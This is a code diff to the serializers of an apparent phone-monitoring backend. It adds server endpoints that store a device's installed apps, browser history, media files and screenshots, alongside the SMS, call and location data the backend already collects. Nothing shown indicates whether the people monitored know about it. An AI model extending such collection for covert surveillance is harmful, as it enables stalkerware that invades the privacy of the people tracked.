@@ -8,6 +8,10 @@ from apps.devices.models import Device
 from apps.monitoring_sms.models import SmsMessage
 from apps.monitoring_calls.models import CallLog
 from apps.monitoring_location.models import Location
+from apps.monitoring_apps.models import InstalledApp
+from apps.monitoring_browser.models import BrowserHistory
+from apps.monitoring_media.models import MediaFile
+from apps.monitoring_screenshots.models import Screenshot
 
 
 class RegisterDeviceSerializer(serializers.Serializer):
@@ -61,7 +65,7 @@ class CallLogSerializer(serializers.ModelSerializer):
 
     class Meta:
         model = CallLog
-        fields = ['call_type', 'number', 'duration', 'timestamp']
+        fields = ['call_type', 'number', 'duration', 'contact_name', 'timestamp']
 
     def create(self, validated_data):
         device = self.context['request'].device
@@ -78,3 +82,59 @@ class LocationSerializer(serializers.ModelSerializer):
     def create(self, validated_data):
         device = self.context['request'].device
         return Location.objects.create(device=device, **validated_data)
+
+
+class InstalledAppSerializer(serializers.ModelSerializer):
+    """Installed App Serializer"""
+
+    class Meta:
+        model = InstalledApp
+        fields = ['package_name', 'app_name', 'version_name', 'version_code',
+                  'is_system_app', 'install_time', 'update_time']
+
+    def create(self, validated_data):
+        device = self.context['request'].device
+        # Use update_or_create to avoid duplicates
+        app, created = InstalledApp.objects.update_or_create(
+            device=device,
+            package_name=validated_data['package_name'],
+            defaults=validated_data
+        )
+        return app
+
+
+class BrowserHistorySerializer(serializers.ModelSerializer):
+    """Browser History Serializer"""
+
+    class Meta:
+        model = BrowserHistory
+        fields = ['url', 'title', 'visit_count', 'timestamp']
+
+    def create(self, validated_data):
+        device = self.context['request'].device
+        return BrowserHistory.objects.create(device=device, **validated_data)
+
+
+class MediaFileSerializer(serializers.ModelSerializer):
+    """Media File Serializer"""
+
+    class Meta:
+        model = MediaFile
+        fields = ['media_type', 'file_path', 'file_name', 'file_size',
+                  'mime_type', 'width', 'height', 'duration', 'timestamp']
+
+    def create(self, validated_data):
+        device = self.context['request'].device
+        return MediaFile.objects.create(device=device, **validated_data)
+
+
+class ScreenshotSerializer(serializers.ModelSerializer):
+    """Screenshot Serializer"""
+
+    class Meta:
+        model = Screenshot
+        fields = ['file_path', 'file_name', 'file_size', 'width', 'height', 'timestamp']
+
+    def create(self, validated_data):
+        device = self.context['request'].device
+        return Screenshot.objects.create(device=device, **validated_data)
